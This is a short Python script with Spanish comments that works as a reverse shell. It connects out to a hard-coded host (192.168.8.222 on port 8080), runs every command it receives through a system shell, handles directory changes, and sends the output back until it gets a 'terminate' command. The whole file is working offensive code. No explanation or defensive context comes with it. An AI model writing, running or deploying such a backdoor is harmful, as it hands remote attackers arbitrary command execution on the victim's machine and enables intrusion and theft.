import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("192.168.8.222", 8080))
        
        while True:
            command = s.recv(1024).decode("utf-8").strip()
            if 'terminate' in command:
                s.close()
                break
            elif command.startswith('cd '):
                # Extraer el directorio de destino del comando
                directory = command[3:]
                try:
                    # Cambiar el directorio de trabajo
                    os.chdir(directory)
                    s.send(b"Changed directory to " + directory.encode("utf-8") + b'\n')
                except Exception as e:
                    s.send(str(e).encode("utf-8") + b'\n')
            else:
                try:
                    cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=os.getcwd())
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", "ignore")
                    s.send(output_str.encode("utf-8") + b'\n')
                except Exception as e:
                    error_message = str(e).encode("utf-8", "ignore") + b'\n'
                    s.send(error_message)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()

def main():
    connect()

if __name__ == "__main__":
    main()